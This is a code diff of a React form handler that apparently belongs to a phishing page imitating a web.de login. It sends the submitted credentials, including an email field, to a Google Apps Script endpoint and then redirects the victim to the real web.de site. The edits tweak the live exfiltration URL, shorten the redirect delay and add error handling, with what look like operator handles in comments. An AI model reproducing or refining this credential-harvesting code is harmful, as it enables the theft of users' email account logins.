@@ -43,8 +43,8 @@ export default function Main() {
 
   const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault()
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
-    // zakk ---- https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec
+    //chibui const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
     
     const formData = new FormData()
     formData.append('email', credentials.email)
@@ -55,10 +55,13 @@ export default function Main() {
         console.log(response)
         setTimeout(() => {
           window.location.replace("https://web.de/")
-        }, 4000);
+        }, 3000);
        
     }
-    )
+    ).catch(err => {
+      console.log(err);
+      
+    })
   }
   
 
